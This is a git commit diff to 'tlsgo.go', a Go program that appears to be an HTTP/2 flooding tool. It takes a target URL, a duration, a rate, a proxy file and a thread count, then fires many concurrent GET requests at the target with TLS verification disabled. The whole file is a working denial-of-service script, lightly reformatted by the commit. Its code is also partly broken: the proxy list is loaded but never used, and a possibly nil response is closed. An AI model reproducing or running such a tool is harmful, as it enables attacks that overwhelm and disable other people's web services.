be43724e231cab21215fc9bc05b8183cbe17a453
yhzwant <116070913+yhzwant@users.noreply.github.com>
2023-10-20 21:20:49 +0800

    Update tlsgo.go

--- tlsgo.go
+++ tlsgo.go
@@ -1,94 +1,99 @@
 package main
 
 import (
-	"bufio"
-	"crypto/tls"
-	"fmt"
-	"math/rand"
-	"net"
-	"net/http"
-	"net/url"
-	"os"
-	"strconv"
-	"strings"
-	"sync"
-	"time"
+  "bufio"
+  "crypto/tls"
+  "fmt"
+  "math/rand"
+  "net/http"
+  "os"
+  "strconv"
+  "strings"
+  "sync"
+  "time"
 )
 
 var proxies []string
 
 func http2(wg *sync.WaitGroup, target string, rps int, config *tls.Config) {
-	defer wg.Done()
+  defer wg.Done()
 
-	client := &http.Client{
-		Transport: &http.Transport{
-			TLSClientConfig:   config,
-			ForceAttemptHTTP2: true,
-		},
-	}
+  client := &http.Client{
+    Transport: &http.Transport{
+      TLSClientConfig:   config,
+      ForceAttemptHTTP2: true,
+    },
+  }
 
-	req, _ := http.NewRequest("GET", target, nil)
-	// Set headers here
+  req, _ := http.NewRequest("GET", target, nil)
+  // Set headers here
 
-	for i := 0; i < rps; i++ {
-		resp, err := client.Do(req)
-		if err != nil || (resp.StatusCode >= 400 && resp.StatusCode != 404) {
-			i-- // Retry on error
-		}
-		resp.Body.Close()
-	}
+  maxRetries := 3
+
+  for i := 0; i < rps; i++ {
+    resp, err := client.Do(req)
+    if err != nil || (resp.StatusCode >= 400 && resp.StatusCode != 404) {
+      if i < maxRetries {
+        i-- // Retry on error
+        continue
+      }
+      fmt.Printf("Request failed after %d retries: %v\n", maxRetries, err)
+      break
+    }
+    resp.Body.Close()
+  }
 }
 
 func main() {
-	rand.Seed(time.Now().UnixNano())
+  rand.Seed(time.Now().UnixNano())
 
-	if len(os.Args) < 6 {
-		fmt.Println("[FIX] go run TLS.go target time ratelimit proxyfile threads")
-		return
-	}
+  if len(os.Args) < 6 {
+    fmt.Println("[FIX] go run TLS.go target time ratelimit proxyfile threads")
+    return
+  }
 
-	target := os.Args[1]
-	duration, _ := strconv.Atoi(os.Args[2])
-	rps, _ := strconv.Atoi(os.Args[3])
-	proxylist := os.Args[4]
-	threads, _ := strconv.Atoi(os.Args[5])
+  target := os.Args[1]
+  duration, _ := strconv.Atoi(os.Args[2])
+  rps, _ := strconv.Atoi(os.Args[3])
+  proxylist := os.Args[4]
+  threads, _ := strconv.Atoi(os.Args[5])
 
-	file, err := os.Open(proxylist)
-	if err != nil {
-		fmt.Println("Error reading file:", err)
-		return
-	}
-	defer file.Close()
+  file, err := os.Open(proxylist)
+  if err != nil {
+    fmt.Println("Error reading file:", err)
+    return
+  }
+  defer file.Close()
 
-	scanner := bufio.NewScanner(file)
-	for scanner.Scan() {
-		proxies = append(proxies, strings.TrimSpace(scanner.Text()))
-	}
+  scanner := bufio.NewScanner(file)
+  for scanner.Scan() {
+    proxies = append(proxies, strings.TrimSpace(scanner.Text()))
+  }
 
-	if len(proxies) == 0 {
-		fmt.Println("No proxies found in the file")
-		return
-	}
+  if len(proxies) == 0 {
+    fmt.Println("No proxies found in the file")
+    return
+  }
 
-	config := &tls.Config{
-		InsecureSkipVerify: true,
-		MinVersion:         tls.VersionTLS12,
-		NextProtos:         []string{"h2"},
-		// Set your curve preferences and cipher suites
-	}
+  config := &tls.Config{
+    InsecureSkipVerify: true,
+    MinVersion:         tls.VersionTLS12,
+    NextProtos:         []string{"h2"},
+    // Set your curve preferences and cipher suites
+  }
 
-	var wg sync.WaitGroup
+  var wg sync.WaitGroup
 
-	for i := 0; i < threads; i++ {
-		wg.Add(1)
-		go http2(&wg, target, rps, config)
-		time.Sleep(1 * time.Millisecond)
-	}
+  for i := 0; i < threads; i++ {
+    wg.Add(1)
+    go http2(&wg, target, rps, config)
+    time.Sleep(1 * time.Millisecond)
+  }
 
-	go func() {
-		time.Sleep(time.Duration(duration) * time.Second)
-		os.Exit(0)
-	}()
+  go func() {
+    time.Sleep(time.Duration(duration) * time.Second)
+    os.Exit(0)
+  }()
 
-	wg.Wait()
+  wg.Wait()
 }
